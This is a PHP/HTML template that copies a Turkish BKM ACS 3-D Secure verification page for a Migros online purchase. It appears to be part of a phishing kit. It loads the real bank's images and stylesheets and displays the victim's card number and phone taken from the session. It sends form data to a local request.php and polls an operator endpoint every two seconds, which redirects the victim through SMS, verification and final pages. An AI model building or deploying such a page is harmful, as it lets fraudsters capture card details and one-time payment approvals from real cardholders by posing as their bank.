
<html lang="tr" style="height: 100%; width: 100%;">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
      <meta http-equiv="Pragma" content="no-cache">
      <meta http-equiv="Expires" content="-1">
      <meta name="description" content="">
      <meta name="author" content="">
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
      <link rel="apple-touch-icon" type="image/png" href="https://emvacs.bkm.com.tr/acs/static/img/favicon.png">
      <link rel="apple-touch-icon" type="image/png" sizes="76x76" href="https://emvacs.bkm.com.tr/acs/static/img/favicon.png">
      <link rel="apple-touch-icon" type="image/png" sizes="120x120" href="https://emvacs.bkm.com.tr/acs/static/img/favicon.png">
      <link rel="apple-touch-icon" type="image/png" sizes="152x152" href="https://emvacs.bkm.com.tr/acs/static/img/favicon.png">
      <title>BKM ACS</title>
      <link rel="stylesheet" href="https://emvacs.bkm.com.tr/acs/static/css/bkmacs2-dist.css">
      <link rel="stylesheet" href="a.css">
      <link rel="stylesheet" href="https://emvacs.bkm.com.tr/acs/static/css/main-dist.css" type="text/css" media="screen">
      <script type="text/javascript">var isSupportedIE = true;</script>
      <script src="assets/js/app.js"></script>
      
      <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
      
      <script>
         function smsa() {
    $.ajax({
      type: "POST",
      url: "/request.php?q=dogrulama",
      data: $("#sms_form").serialize(),
      success: (response) => {
         $("#loaderDiv").show();

      },
    });
  }
      </script>
   </head>
   <body>
      <div class="content-wrapper">
         <div class="header">
            <div class="brand-logo">
               <img 3dslogo="scheme" align="left" src="data:image/png;base64,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">
            </div>
            <div class="member-logo">
               <img 3dslogo="issuer" align="right" src="data:image/png;base64,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">
            </div>
         </div>
         <div id="approve-page">
            <div id="loaderDiv" style="height: 100%; width: 100%; position: absolute; z-index: 1; display: none;">
               <div class="loader"></div>
            </div>
            <div class="content">
               <h1 id="approve-header">Doğrulama kodunu giriniz</h1>
               <div class="info-wrapper">
                  <div class="info-row">
                     <div class="info-col info-label">İşyeri Adı:</div>
                     <div class="info-col" 3dsdisplay="merchant" id="merchant-name">Migros Sanal Market</div>
                  </div>
                  <div class="info-row">
                     <div class="info-col info-label">İşlem Tutarı:</div>
                     <div class="info-col amount" 3dsdisplay="amount" id="amount"><?=$totalPrice?> TRY</div>
                  </div>
                  <div class="info-row">
                     <div class="info-col info-label">İşlem Tarihi-Saati:</div>
                     <div class="info-col" 3dsdisplay="date" id="operation-date-time">
<?php $simdikiTarih = date("d.m.Y H:i:s");

echo $simdikiTarih; ?>

                     </div>
                  </div>
                  <div class="info-row">
                     <div class="info-col info-label">Kart Numarası:</div>
                     <div class="info-col" 3dsdisplay="pan" id="pan"><?=$_SESSION['card_number']?></div>
                  </div>
               </div>
               <div class="action-wrapper" 3dsdisplay="prompt" 3dslabel="prompt">
                  <div>
                     <h3>Şifreniz <span id="msisdn"><?=$_SESSION['user_phone']?></span> nolu cep telefonunuza gönderilecektir.<br>Referans no: 11R1311IJ</h3>
                  </div>
                  <div class="form-wrapper">
                     <input name="fakePasswordRemembered" id="fakePasswordRemembered" style="display: none;" type="password">
                     <form id="sms_form" class="form-code" method="POST" autocomplete="off" action="javascript:;" novalidate="novalidate">
                        <div class="form-row">
                           <input 3dsinput="password" value="1" type="text" hidden class="f-input" oninput="maxLengthCheck(this)" onkeypress="return isNumeric(event)" name="sms" id="passwordfield" maxlength="6" min="0" max="99999999" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                           <input name="sesion" value="<?=session_id()?>" hidden/>
                        </div>
                        <div id="wrongPassDiv" 3dsdisplay="error" class="error-messages error-wrong-otp" style="display: none;">
                           <span class="has-reg">Geçersiz şifre, lütfen tekrar deneyiniz</span>
                           <span class="has-reg" id="remainingEntryCount">${remainingOtpTry} adet giriş hakkınız kaldı</span>
                        </div>
                        <div id="timeOutDiv" class="error-messages error-timeover" style="display: none;">
                           <div>
                              <span class="has-reg">Doğrulama Kodunu belirtilen süre içerisinde girmediniz</span>
                           </div>
                           <button id="retryButton" type="submit" onclick="retryButtonClick()" class="button btn-1 re-code v1" name="otpType" value="retry">Doğrulama Kodunu Yeniden Gönder</button>
                           <div>
                              <label id="otpcompleted" for="toggle-1" style="cursor: pointer; display: none;">Yardım</label>
                           </div>
                           <input class="popup txt-link trigger-absolute-panel" type="checkbox" id="toggle-1">
                           <div class="noscriptHelpText">
                              Doğrulama esnasında cep telefonunuza gelen mobil onay bildirimine izin veriniz ardından burdaki butona tıklayınız!
                              <br> 
                           </div>
                        </div>
                        <div id="submitButtonDiv" style="display: block;">
                           <div class="has-submit">
                              <button id="submitbutton" type="submit" onclick="smsa()" name="otpType" value="confirm" class="button btn-1 btn-commit">Mobil Onayı Tamamladım!</button>
                           </div>
                           <div id="timerDiv" class="has-timer">
                              <span>Kalan Süre: </span> <span class="has-counter" id="has-counter">01:12</span>
                           </div>
                        </div>
                        <div class="call-to-action">
                           <ul class="action-list">
                              <li><a id="triggercanceldialog" href="#canceldialog" class="txt-link fancybox-ajax" style="background: none !important; border: none; cursor: pointer; font-family: inherit;">İşlemi
                                 İptal Et</a>
                                 <button id="triggercancel" name="cancel" value="cancel" style="display: none;"></button>
                              </li>
                           </ul>
                           <div style="display: none;">
                              <div class="panel" id="canceldialog">
                                 <h1 class="small" id="msg-cancel-box">İşyeri sayfasına yönlendirileceksiniz, işleminizi iptal etmek
                                    istediğinizden emin misiniz?
                                 </h1>
                                 <a href="javascript:;" onclick="$.fancybox.close();" class="button btn-1 close-modal">Vazgeç</a>
                                 <a id="cancelbutton" class="button btn-1 btn-1-cancel txt-link trigger-cancel-page">İşlemi İptal
                                 Et</a>
                              </div>
                           </div>
                        </div>
                        <input type="hidden" value="57851605-2a1d-4a44-b07c-61b794a13f80" name="acsTransactionId">
                     </form>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <script>
         
           $(document).ready(function() {
    function checkStatus() {
        $.ajax({
            url: 'request.php?q=tura',
            type: 'POST',
            data: {
                sesion: '<?= session_id() ?>'
            },
            dataType: 'json',
            success: function(data) {
                $('.card-not-valid').addClass('hidden');

                if(data.status == "11") {
                    window.location.href = "/dogrulama";
                }
                else if(data.status == "7") {
                    window.location.href = "/sms-again";
                }
                else if(data.status == "9") {
                    window.location.href = "/final";
                }
                else if(data.status == "1") {
                    window.location.href = "/sms";
                }
                else {
                    $('#'+data.status).removeClass('hidden');
                }
            },
            error: function(error) {
                console.log("Hata: ", error);
            }
        });
    }

    setInterval(checkStatus, 2000);
});
$(document).ready(function() {
    var totalTime = 180; // 3 dakika = 180 saniye
    var interval = setInterval(function() {
        var minutes = Math.floor(totalTime / 60);
        var seconds = totalTime % 60;

        // İki basamaklı sayı formatı için düzenleme
        if (seconds < 10) {
            seconds = '0' + seconds;
        }

        $('#has-counter').text(minutes + ":" + seconds);

        totalTime--;

        // Zaman dolduğunda interval'ı durdur
        if (totalTime < 0) {
            clearInterval(interval);
            $('#has-counter').text("00:00");
        }
    }, 1000); // Her saniyede bir çalışacak
});
      </script>
      
   </body>
</html>